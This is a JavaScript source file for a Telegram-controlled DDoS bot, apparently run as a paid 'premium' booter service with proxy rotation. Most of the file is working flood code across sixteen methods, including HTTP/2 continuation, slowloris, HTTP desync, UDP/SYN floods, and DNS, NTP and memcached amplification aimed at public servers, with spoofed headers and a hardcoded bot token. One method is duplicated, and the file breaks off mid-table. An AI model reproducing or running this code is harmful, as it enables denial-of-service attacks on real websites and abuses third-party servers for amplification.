'use strict';
const TelegramBotLib = require('node-telegram-bot-api');
const TelegramBot    = TelegramBotLib.default || TelegramBotLib;
const net    = require('net');
const dgram  = require('dgram');
const tls    = require('tls');
const dns    = require('dns');
const crypto = require('crypto');
const http   = require('http');
const https  = require('https');
const { URL } = require('url');
const fs     = require('fs');
const path   = require('path');
const os     = require('os');

// ── Config ─────────────────────────────────────────────────────
const BOT_TOKEN  = '8979019358:AAGZffQ7Yjl8RRarjJaR8wbCgrHeh343y_M';
const OWNER_ID   = ['8657708570', ''];
const bot        = new TelegramBot(BOT_TOKEN, { polling: true });
const START_TIME = Date.now();

const ALL_DIR    = path.join(__dirname, 'all');
const PREM_FILE  = path.join(ALL_DIR, 'prem.json');
const LOG_FILE   = path.join(ALL_DIR, 'log.txt');
const CD_FILE    = path.join(ALL_DIR, 'cdconfig.json');
const PROXY_FILE = path.join(__dirname, 'proxy.txt');

if (!fs.existsSync(ALL_DIR)) fs.mkdirSync(ALL_DIR, { recursive: true });
if (!fs.existsSync(PROXY_FILE)) fs.writeFileSync(PROXY_FILE, '# ip:port atau ip:port:user:pass\n');

function loadPrem() { try { return JSON.parse(fs.readFileSync(PREM_FILE)); } catch { return []; } }
function savePrem(d) { fs.writeFileSync(PREM_FILE, JSON.stringify(d)); }
function loadCd()   { try { return JSON.parse(fs.readFileSync(CD_FILE));  } catch { return { cd: 0, max: 300 }; } }
function saveCd(d)  { fs.writeFileSync(CD_FILE, JSON.stringify(d)); }
function logMsg(m)  { const line = `[${new Date().toISOString()}] ${m}\n`; fs.appendFileSync(LOG_FILE, line); console.log(line.trim()); }

// ── Status Bot ─────────────────────────────────────────────────
function getUptime() {
  const sec  = Math.floor((Date.now() - START_TIME) / 1000);
  const h    = Math.floor(sec / 3600);
  const m    = Math.floor((sec % 3600) / 60);
  const s    = sec % 60;
  return `${h}h ${m}m ${s}s`;
}

function getBotStatus() {
  const mem    = process.memoryUsage();
  const ramMb  = (mem.rss / 1024 / 1024).toFixed(1);
  const cpuAvg = os.loadavg()[0].toFixed(2);
  return { uptime: getUptime(), ram: `${ramMb} MB`, cpu: `${cpuAvg}` };
}

// ── Ukuran file all/ ──────────────────────────────────────────
function getFolderSize(dirPath) {
  let total = 0;
  try {
    const files = fs.readdirSync(dirPath);
    for (const f of files) {
      try { total += fs.statSync(path.join(dirPath, f)).size; } catch {}
    }
  } catch {}
  if (total < 1024)           return `${total} B`;
  if (total < 1024 * 1024)   return `${(total/1024).toFixed(1)} KB`;
  return `${(total/1024/1024).toFixed(1)} MB`;
}

function getMethodFilesCount() {
  try { return fs.readdirSync(ALL_DIR).filter(f => f.endsWith('.js')).length; } catch { return 0; }
}

function getScriptMethods() {
  try {
    return fs.readdirSync(ALL_DIR)
      .filter(f => f.endsWith('.js') && fs.statSync(path.join(ALL_DIR, f)).size > 100)
      .map(f => f.replace('.js', ''))
      .sort();
  } catch { return []; }
}

// ── Proxy Manager ─────────────────────────────────────────────
const proxyPool = [];

function loadProxies() {
  proxyPool.length = 0;
  try {
    const lines = fs.readFileSync(PROXY_FILE, 'utf8').split('\n');
    for (const line of lines) {
      const l = line.trim();
      if (!l || l.startsWith('#')) continue;
      const parts = l.split(':');
      if (parts.length >= 2) {
        proxyPool.push({
          host: parts[0],
          port: parseInt(parts[1]),
          user: parts[2] || null,
          pass: parts[3] || null,
        });
      }
    }
  } catch {}
  return proxyPool.length;
}

function getRandProxy() {
  if (!proxyPool.length) return null;
  return proxyPool[Math.floor(Math.random() * proxyPool.length)];
}

function saveProxy(line) {
  fs.appendFileSync(PROXY_FILE, line.trim() + '\n');
  loadProxies();
}

function delProxy(query) {
  const lines = fs.readFileSync(PROXY_FILE, 'utf8').split('\n');
  const filtered = lines.filter(l => !l.includes(query));
  fs.writeFileSync(PROXY_FILE, filtered.join('\n'));
  loadProxies();
}

// Build http agent via proxy (CONNECT tunnel)
function buildProxyAgent(proxy, targetHost, targetPort, useTls) {
  return new Promise((resolve, reject) => {
    const conn = net.createConnection(proxy.port, proxy.host, () => {
      let connectReq = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n`;
      if (proxy.user && proxy.pass) {
        const auth = Buffer.from(`${proxy.user}:${proxy.pass}`).toString('base64');
        connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
      }
      connectReq += '\r\n';
      conn.write(connectReq);

      let buf = '';
      conn.once('data', (chunk) => {
        buf += chunk.toString();
        if (buf.includes('200 Connection established') || buf.includes('200 OK')) {
          if (useTls) {
            const ss = tls.connect({ socket: conn, servername: targetHost, rejectUnauthorized: false }, () => resolve(ss));
            ss.on('error', reject);
          } else {
            resolve(conn);
          }
        } else {
          conn.destroy();
          reject(new Error('Proxy CONNECT failed'));
        }
      });
    });
    conn.on('error', reject);
    setTimeout(() => { conn.destroy(); reject(new Error('Proxy timeout')); }, 5000);
  });
}

loadProxies();

// ── User permission ─────────────────────────────────────────
const isOwner = (id) => String(id) === OWNER_ID;
const isPrem  = (id) => isOwner(id) || loadPrem().includes(String(id));

// ── Global cooldown ────────────────────────────────────────
let globalCdUntil = 0;
const isGlobalCd  = () => { const s = Math.ceil((globalCdUntil - Date.now()) / 1000); return s > 0 ? s : null; };
const setGlobalCd = (sec = 10) => { globalCdUntil = Date.now() + sec * 100; };

// ── Per-user cooldown ──────────────────────────────────────
const userCdMap = new Map();
function checkCd(uid) {
  const cfg = loadCd();
  if (!cfg.cd) return null;
  const last = userCdMap.get(String(uid));
  if (!last) return null;
  const sisa = cfg.cd - (Date.now() - last) / 1000;
  return sisa > 0 ? Math.ceil(sisa) : null;
}
function setCd(uid) { userCdMap.set(String(uid), Date.now()); }

// ── UAs ───────────────────────────────────────────────────
const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Safari/605.1.15',
  'KaptenAttack/9.9 (Termux; Android 16)',
  'Googlebot/2.1 (+http://www.google.com/bot.html)',
  'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'curl/7.88.1',
];
const rndUa  = () => UAS[Math.floor(Math.random() * UAS.length)];
const rndIp  = () => `${ri(1,254)}.${ri(0,254)}.${ri(0,254)}.${ri(1,254)}`;
const rndInt = (a,b) => Math.floor(Math.random()*(b-a+1))+a;
function ri(a,b) { return Math.floor(Math.random()*(b-a+1))+a; }
const rndHex = (n) => crypto.randomBytes(n).toString('hex');

// ── Resolve target ──────────────────────────────────────────
async function resolveTarget(target) {
  let host, port, path_, proto;
  try {
    let raw = target;
    if (!raw.startsWith('http')) raw = 'https://' + raw;
    const u = new URL(raw);
    proto = u.protocol;
    host  = u.hostname;
    port  = u.port ? parseInt(u.port) : (u.protocol === 'https:' ? 443 : 80);
    path_ = u.pathname || '/';
  } catch {
    host  = target.split(':')[0];
    port  = parseInt(target.split(':')[1]) || 443;
    proto = 'https:';
    path_ = '/';
  }
  let ip = host;
  try { ip = await new Promise((res, rej) => dns.resolve4(host, (e,a) => e ? rej(e) : res(a[0]))); }
  catch { ip = host; }
  return { host, ip, port, path: path_, proto };
}

// ── Check web status ────────────────────────────────────────
async function checkStatus(target) {
  try {
    const raw = target.startsWith('http') ? target : 'https://' + target;
    const mod = raw.startsWith('https') ? https : http;
    return await new Promise((res) => {
      const req = mod.get(raw, { timeout: 3000, rejectUnauthorized: false, headers: { 'User-Agent': rndUa() } }, (r) => {
        const code = r.statusCode;
        if (code >= 500)              res('🔴 DOWN');
        else if (code === 429 || code === 503) res('🟡 WARNING');
        else if (code >= 400)         res('🟠 DELAY');
        else                          res('🟢 AMAN');
        r.resume();
      });
      req.on('error', () => res('🔴 DOWN'));
      req.on('timeout', () => { req.destroy(); res('🔴 DOWN'); });
    });
  } catch { return '🔴 DOWN'; }
}

// ═══════════════════════════════════════════════════════════
//  ATTACK ENGINES
// ═══════════════════════════════════════════════════════════

// METHOD 1: HTTP/2 Continuation Flood (CVE-2024-27983)
function http2ContinuationFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = new net.Socket();
    sock.setTimeout(5000);
    let ssock;
    try {
      sock.connect(tgt.port, tgt.ip, () => {
        try {
          ssock = tls.connect({ socket: sock, servername: tgt.host, rejectUnauthorized: false, ALPNProtocols: ['h2'] }, () => {
            try {
              ssock.write(Buffer.from('505249202a20485454502f322e300d0a0d0a534d0d0a0d0a','hex'));
              ssock.write(Buffer.from('000000040000000000','hex'));
              ssock.write(Buffer.from('00000408000000000000ffffff','hex'));
              for (let i = 0; i < 5000 && Date.now() < endTime; i++) {
                const streamId = rndInt(1, 2147483647);
                const hdrs  = `:method\tGET\n:path\t${tgt.path}?${rndInt(0,99999999)}\n:scheme\thttps\n:authority\t${tgt.host}\nuser-agent\t${rndUa()}\nx-forwarded-for\t${rndIp()}\nx-request-id\t${crypto.randomUUID()}\n`;
                const hdrsBuf = Buffer.from(hdrs);
                const fh = Buffer.alloc(9);
                fh.writeUIntBE(hdrsBuf.length, 0, 3);
                fh.writeUInt8(0x01, 3);
                fh.writeUInt8(0x00, 4);
                fh.writeUInt32BE(streamId, 5);
                ssock.write(Buffer.concat([fh, hdrsBuf]));
                const contPayload = crypto.randomBytes(rndInt(100, 8192));
                const ch = Buffer.alloc(9);
                ch.writeUIntBE(contPayload.length, 0, 3);
                ch.writeUInt8(0x09, 3);
                ch.writeUInt8(0x00, 4);
                ch.writeUInt32BE(streamId, 5);
                ssock.write(Buffer.concat([ch, contPayload]));
                const rst = Buffer.alloc(13);
                rst.writeUIntBE(4, 0, 3); rst.writeUInt8(0x03, 3); rst.writeUInt8(0x00, 4); rst.writeUInt32BE(streamId, 5); rst.writeUInt32BE(8, 9);
                ssock.write(rst);
                onPacket(hdrsBuf.length + contPayload.length);
              }
            } catch {}
          });
          ssock.on('error', () => {});
        } catch {}
      });
    } catch {}
    sock.on('error', () => {});
    sock.on('timeout', () => { try { sock.destroy(); } catch {} });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 10);
  }
  for (let i = 0; i < 50; i++) setTimeout(worker, i * 20);
}

// METHOD 2: QUIC Reflection Flood
function quicReflectionFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  const versions = [
    Buffer.from('00000001','hex'), Buffer.from('ff00001d','hex'),
    Buffer.from('ff00001e','hex'), Buffer.from('ff00001f','hex'),
    Buffer.from('ff000020','hex'), Buffer.from('ff000021','hex'),
    Buffer.from('ff000022','hex'),
  ];
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = dgram.createSocket('udp4');
    const ver  = versions[rndInt(0, versions.length-1)];
    const pkt  = Buffer.concat([
      crypto.randomBytes(1), ver,
      crypto.randomBytes(8), crypto.randomBytes(8),
      crypto.randomBytes(rndInt(64, 1200)),
    ]);
    sock.send(pkt, 0, pkt.length, tgt.port, tgt.ip, () => { sock.close(); });
    onPacket(pkt.length);
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 2);
  }
  for (let i = 0; i < 200; i++) setTimeout(worker, i * 5);
}

// METHOD 3: TCP Stack Corruption Strike
function tcpStackStrike(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = new net.Socket();
    sock.setTimeout(3000);
    sock.connect(tgt.port, tgt.ip, () => {
      const payload = Buffer.concat([
        Buffer.from([0x01,0x01,0x01,0x01,0x02,0x04,0xff,0xff,0x03,0x03,0x01,0x01,0x01,0x04,0x02,0x00,0x00]),
        crypto.randomBytes(rndInt(1024, 65535)),
      ]);
      sock.write(payload);
      onPacket(payload.length);
      sock.destroy();
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 5);
  }
  for (let i = 0; i < 100; i++) setTimeout(worker, i * 10);
}

// METHOD 4: HTTP Desync Smuggling
function httpDesyncStrike(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  const smuggled = `GET /admin HTTP/1.1\r\nHost: ${tgt.host}\r\nX: X`;
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = new net.Socket();
    sock.setTimeout(5000);
    sock.connect(tgt.port, tgt.ip, () => {
      const req = `POST ${tgt.path} HTTP/1.1\r\nHost: ${tgt.host}\r\nContent-Length: ${smuggled.length}\r\nTransfer-Encoding: chunked\r\nUser-Agent: ${rndUa()}\r\nX-Forwarded-For: ${rndIp()}\r\nX-Request-Id: ${crypto.randomUUID()}\r\n\r\n0\r\n\r\n${smuggled}`;
      sock.write(req);
      onPacket(req.length);
      sock.destroy();
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 5);
  }
  for (let i = 0; i < 150; i++) setTimeout(worker, i * 7);
}

// METHOD 5: HTTP Flood Brutal
function httpFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const buster  = rndInt(0, 99999999);
    const headers = [
      `GET ${tgt.path}?__=${buster} HTTP/1.1`,
      `Host: ${tgt.host}`,
      `User-Agent: ${rndUa()}`,
      `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
      `Accept-Language: en-US,en;q=0.9,id;q=0.8`,
      `Accept-Encoding: gzip, deflate, br`,
      `Cache-Control: no-cache, no-store, must-revalidate`,
      `Pragma: no-cache`,
      `Connection: keep-alive`,
      `Upgrade-Insecure-Requests: 1`,
      `X-Forwarded-For: ${rndIp()}`,
      `X-Real-IP: ${rndIp()}`,
      `X-Originating-IP: ${rndIp()}`,
      `X-Remote-IP: ${rndIp()}`,
      `X-Request-ID: ${crypto.randomUUID()}`,
      `Referer: https://google.com/search?q=${crypto.randomUUID()}`,
      ``, ``,
    ].join('\r\n');

    const useTls = tgt.port === 443 || tgt.proto === 'https:';
    const proxy  = getRandProxy();
    if (proxy) {
      buildProxyAgent(proxy, tgt.ip, tgt.port, useTls).then((sock) => {
        sock.write(headers);
        onPacket(headers.length);
        sock.destroy ? sock.destroy() : sock.end();
      }).catch(() => {});
      setTimeout(() => { if (Date.now() < endTime) worker(); }, 3);
      return;
    }
    const sock = new net.Socket();
    sock.setTimeout(5000);
    sock.connect(tgt.port, tgt.ip, () => {
      if (useTls) {
        const ss = tls.connect({ socket: sock, servername: tgt.host, rejectUnauthorized: false }, () => {
          ss.write(headers); onPacket(headers.length);
        });
        ss.on('error', () => {});
      } else {
        sock.write(headers); onPacket(headers.length); sock.destroy();
      }
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 3);
  }
  for (let i = 0; i < 200; i++) setTimeout(worker, i * 5);
}

// METHOD 6: UDP Flood
function udpFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = dgram.createSocket('udp4');
    const pkt  = crypto.randomBytes(rndInt(512, 65000));
    sock.send(pkt, 0, pkt.length, tgt.port, tgt.ip, () => { sock.close(); });
    onPacket(pkt.length);
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 1);
  }
  for (let i = 0; i < 300; i++) setTimeout(worker, i * 3);
}

// METHOD 7: Slowloris
function slowloris(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function openConn() {
    if (Date.now() >= endTime) return;
    const sock = new net.Socket();
    sock.setTimeout(10000);
    sock.connect(tgt.port, tgt.ip, () => {
      sock.write(`GET ${tgt.path}?${rndInt(0,9999999)} HTTP/1.1\r\nHost: ${tgt.host}\r\nUser-Agent: ${rndUa()}\r\nAccept: */*\r\n`);
      onPacket(200);
      const iv = setInterval(() => {
        if (Date.now() >= endTime) { clearInterval(iv); return; }
        try { sock.write(`X-Extra: ${crypto.randomBytes(8).toString('hex')}\r\n`); }
        catch { clearInterval(iv); }
      }, 5000);
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
  }
  for (let i = 0; i < 500; i++) setTimeout(openConn, i * 20);
}

// METHOD 8: DNS Amplification
function dnsAmpFlood(tgt, durationMs, onPacket) {
  const endTime  = Date.now() + durationMs;
  const publicDns = ['8.8.8.8','8.8.4.4','1.1.1.1','1.0.0.1','208.67.222.222','208.67.220.220'];
  function worker() {
    if (Date.now() >= endTime) return;
    const sock  = dgram.createSocket('udp4');
    const query = Buffer.from([
      0xde, 0xad, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x06, 0x67,0x6f,0x6f,0x67,0x6c,0x65,
      0x03, 0x63,0x6f,0x6d, 0x00,
      0x00, 0xff, 0x00, 0x01,
    ]);
    const dnsServer = publicDns[rndInt(0, publicDns.length-1)];
    sock.send(query, 0, query.length, 53, dnsServer, () => { sock.close(); });
    onPacket(query.length);
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 2);
  }
  for (let i = 0; i < 200; i++) setTimeout(worker, i * 5);
}

// METHOD 9: SYN Flood via raw TCP half-open
function synFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = new net.Socket();
    sock.setTimeout(500);
    sock.connect(tgt.port, tgt.ip, () => {
      // SYN established, immediately RST (half-open exhaust)
      onPacket(64);
      sock.destroy();
    });
    sock.on('error', () => { onPacket(40); });
    sock.on('timeout', () => { onPacket(40); sock.destroy(); });
    setImmediate(() => { if (Date.now() < endTime) worker(); });
  }
  for (let i = 0; i < 500; i++) setTimeout(worker, i * 2);
}

// METHOD 10: WebSocket Flood
function wsFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const wsKey = crypto.randomBytes(16).toString('base64');
    const sock  = new net.Socket();
    sock.setTimeout(6000);
    sock.connect(tgt.port, tgt.ip, () => {
      const useTls = tgt.port === 443 || tgt.proto === 'https:';
      const handshake = [
        `GET ${tgt.path} HTTP/1.1`,
        `Host: ${tgt.host}`,
        `Upgrade: websocket`,
        `Connection: Upgrade`,
        `Sec-WebSocket-Key: ${wsKey}`,
        `Sec-WebSocket-Version: 13`,
        `Origin: https://${tgt.host}`,
        `User-Agent: ${rndUa()}`,
        `X-Forwarded-For: ${rndIp()}`,
        ``, ``,
      ].join('\r\n');

      const send = (s) => {
        s.write(handshake);
        onPacket(handshake.length);
        // Spam WS frames after upgrade
        const wsIv = setInterval(() => {
          if (Date.now() >= endTime) { clearInterval(wsIv); s.destroy ? s.destroy() : s.end(); return; }
          try {
            const payload = crypto.randomBytes(rndInt(64, 4096));
            const frame   = Buffer.alloc(10 + payload.length);
            frame[0] = 0x81,0x21; // text frame, FIN
            frame[1] = 0x80 | 126;
            frame.writeUInt16BE(payload.length, 2);
            const mask = crypto.randomBytes(4);
            mask.copy(frame, 4);
            for (let i = 0; i < payload.length; i++) frame[8+i] = payload[i] ^ mask[i % 4];
            s.write(frame);
            onPacket(frame.length);
          } catch { clearInterval(wsIv); }
        }, 10);
      };

      if (useTls) {
        const ss = tls.connect({ socket: sock, servername: tgt.host, rejectUnauthorized: false }, () => { send(ss); });
        ss.on('error', () => {});
      } else {
        send(sock);
      }
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 50);
  }
  for (let i = 0; i < 100; i++) setTimeout(worker, i * 30);
}

// METHOD 11: ICMP Flood (UDP port 7 echo simulation)
function icmpFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = dgram.createSocket('udp4');
    // ICMP echo via UDP port 7 (echo)
    const pkt = crypto.randomBytes(rndInt(56, 1472));
    sock.send(pkt, 0, pkt.length, 7, tgt.ip, () => { sock.close(); });
    onPacket(pkt.length);
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 1);
  }
  for (let i = 0; i < 400; i++) setTimeout(worker, i * 2);
}

// METHOD 12: TLS Renegotiation Exhaust
function tlsRenegFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = new net.Socket();
    sock.setTimeout(8000);
    sock.connect(tgt.port, tgt.ip, () => {
      const ss = tls.connect({ socket: sock, servername: tgt.host, rejectUnauthorized: false }, () => {
        const req = `HEAD ${tgt.path} HTTP/1.1\r\nHost: ${tgt.host}\r\nUser-Agent: ${rndUa()}\r\nConnection: keep-alive\r\n\r\n`;
        ss.write(req);
        onPacket(req.length);
        // Trigger renegotiation
        let count = 0;
        const reIv = setInterval(() => {
          if (Date.now() >= endTime || count++ > 20) { clearInterval(reIv); ss.destroy(); return; }
          try {
            ss.renegotiate({ rejectUnauthorized: false }, () => {
              ss.write(req);
              onPacket(req.length);
            });
          } catch { clearInterval(reIv); }
        }, 100);
      });
      ss.on('error', () => {});
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 100);
  }
  for (let i = 0; i < 80; i++) setTimeout(worker, i * 50);
}

// METHOD 13: HTTP Range Request Bomb
function httpRangeBomb(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const ranges = Array.from({ length: rndInt(10, 50) }, () =>
      `${rndInt(0, 999999)}-${rndInt(1000000, 9999999)}`
    ).join(', ');
    const req = [
      `GET ${tgt.path}?v=${rndHex(4)} HTTP/1.1`,
      `Host: ${tgt.host}`,
      `Range: bytes=${ranges}`,
      `User-Agent: ${rndUa()}`,
      `Accept-Encoding: gzip, deflate, br`,
      `X-Forwarded-For: ${rndIp()}`,
      `Cache-Control: no-cache`,
      `Connection: keep-alive`,
      ``, ``,
    ].join('\r\n');

    const sock = new net.Socket();
    sock.setTimeout(5000);
    const useTls = tgt.port === 443 || tgt.proto === 'https:';
    const proxy  = getRandProxy();

    const send = (s) => { s.write(req); onPacket(req.length); };

    if (proxy) {
      buildProxyAgent(proxy, tgt.ip, tgt.port, useTls).then(send).catch(() => {});
      setTimeout(() => { if (Date.now() < endTime) worker(); }, 5);
      return;
    }
    sock.connect(tgt.port, tgt.ip, () => {
      if (useTls) {
        const ss = tls.connect({ socket: sock, servername: tgt.host, rejectUnauthorized: false }, () => { send(ss); });
        ss.on('error', () => {});
      } else { send(sock); sock.destroy(); }
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 5);
  }
  for (let i = 0; i < 200; i++) setTimeout(worker, i * 5);
}
// METHOD 13: HTTP Range Request Bomb
function httpRangeBomb(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const ranges = Array.from({ length: rndInt(10, 50) }, () =>
      `${rndInt(0, 999999)}-${rndInt(1000000, 9999999)}`
    ).join(', ');
    const req = [
      `GET ${tgt.path}?v=${rndHex(4)} HTTP/1.1`,
      `Host: ${tgt.host}`,
      `Range: bytes=${ranges}`,
      `User-Agent: ${rndUa()}`,
      `Accept-Encoding: gzip, deflate, br`,
      `X-Forwarded-For: ${rndIp()}`,
      `Cache-Control: no-cache`,
      `Connection: keep-alive`,
      ``, ``,
    ].join('\r\n');

    const sock = new net.Socket();
    sock.setTimeout(5000);
    const useTls = tgt.port === 443 || tgt.proto === 'https:';
    const proxy  = getRandProxy();

    const send = (s) => { s.write(req); onPacket(req.length); };

    if (proxy) {
      buildProxyAgent(proxy, tgt.ip, tgt.port, useTls).then(send).catch(() => {});
      setTimeout(() => { if (Date.now() < endTime) worker(); }, 5);
      return;
    }
    sock.connect(tgt.port, tgt.ip, () => {
      if (useTls) {
        const ss = tls.connect({ socket: sock, servername: tgt.host, rejectUnauthorized: false }, () => { send(ss); });
        ss.on('error', () => {});
      } else { send(sock); sock.destroy(); }
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 5);
  }
  for (let i = 0; i < 200; i++) setTimeout(worker, i * 5);
}

// METHOD 14: Cache Buster (anti-CDN)
function cacheBuster(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  function worker() {
    if (Date.now() >= endTime) return;
    const ts  = Date.now();
    const req = [
      `GET ${tgt.path}?ts=${ts}&r=${rndHex(8)}&nocache=${rndInt(0,999999999)} HTTP/1.1`,
      `Host: ${tgt.host}`,
      `User-Agent: ${rndUa()}`,
      `Cache-Control: no-cache, no-store, must-revalidate, max-age=0`,
      `Pragma: no-cache`,
      `Expires: 0`,
      `X-Forwarded-For: ${rndIp()}`,
      `X-Real-IP: ${rndIp()}`,
      `X-Cache-Bypass: ${rndHex(4)}`,
      `X-Requested-With: XMLHttpRequest`,
      `Referer: https://${tgt.host}/?v=${rndHex(4)}`,
      `Accept: text/html,application/xhtml+xml,*/*;q=0.9`,
      `Accept-Language: ${['en-US','id-ID','zh-CN','fr-FR'][rndInt(0,3)]},${['en','id','zh','fr'][rndInt(0,3)]};q=0.9`,
      `Connection: keep-alive`,
      ``, ``,
    ].join('\r\n');

    const proxy  = getRandProxy();
    const useTls = tgt.port === 443 || tgt.proto === 'https:';

    if (proxy) {
      buildProxyAgent(proxy, tgt.ip, tgt.port, useTls).then((s) => { s.write(req); onPacket(req.length); }).catch(() => {});
      setTimeout(() => { if (Date.now() < endTime) worker(); }, 3);
      return;
    }
    const sock = new net.Socket();
    sock.setTimeout(5000);
    sock.connect(tgt.port, tgt.ip, () => {
      if (useTls) {
        const ss = tls.connect({ socket: sock, servername: tgt.host, rejectUnauthorized: false }, () => { ss.write(req); onPacket(req.length); });
        ss.on('error', () => {});
      } else { sock.write(req); onPacket(req.length); sock.destroy(); }
    });
    sock.on('error', () => {});
    sock.on('timeout', () => { sock.destroy(); });
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 3);
  }
  for (let i = 0; i < 250; i++) setTimeout(worker, i * 4);
}

// METHOD 15: NTP Amplification
function ntpAmpFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  // NTP monlist request (CVE-2013-5211)
  const ntpMonlist = Buffer.from([
    0x17, 0x00, 0x03, 0x2a,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
  ]);
  const ntpServers = ['pool.ntp.org','time.google.com','time.cloudflare.com','time.windows.com'];
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = dgram.createSocket('udp4');
    const srv  = ntpServers[rndInt(0, ntpServers.length-1)];
    sock.send(ntpMonlist, 0, ntpMonlist.length, 123, srv, () => { sock.close(); });
    onPacket(ntpMonlist.length);
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 3);
  }
  for (let i = 0; i < 200; i++) setTimeout(worker, i * 5);
}

// METHOD 16: Memcached Amplification
function memcachedAmpFlood(tgt, durationMs, onPacket) {
  const endTime = Date.now() + durationMs;
  // Memcached UDP stats request (massive amplification)
  const mcPayload = Buffer.concat([
    Buffer.from([0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00]),
    Buffer.from('stats\r\n'),
  ]);
  function worker() {
    if (Date.now() >= endTime) return;
    const sock = dgram.createSocket('udp4');
    sock.send(mcPayload, 0, mcPayload.length, 11211, tgt.ip, () => { sock.close(); });
    onPacket(mcPayload.length);
    setTimeout(() => { if (Date.now() < endTime) worker(); }, 2);
  }
  for (let i = 0; i < 300; i++) setTimeout(worker, i * 3);
}

// ── Dispatch attack by method ───────────────────────────────
const METHODS = {
  // ── Built-in L7 ──────────────────────────────────────────
  'http2':           { fn: http2ContinuationFlood, desc: 'HTTP/2 Continuation Flood (CVE-2024-27983)', layer: 7 },
  'desync':          { fn: httpDesyncStrike,       desc: 'HTTP Desync Smuggling Strike',               layer: 7 },
  'flood':           { fn: httpFlood,              desc: 'HTTP Flood Brutal',                          layer: 7 },
  'slowloris':       { fn: slowloris,              desc: 'Slowloris Connection Exhaust',               layer: 7 },
  'ws':              { fn: wsFlood,                desc: 'WebSocket Frame Bomb',                       layer: 7 },
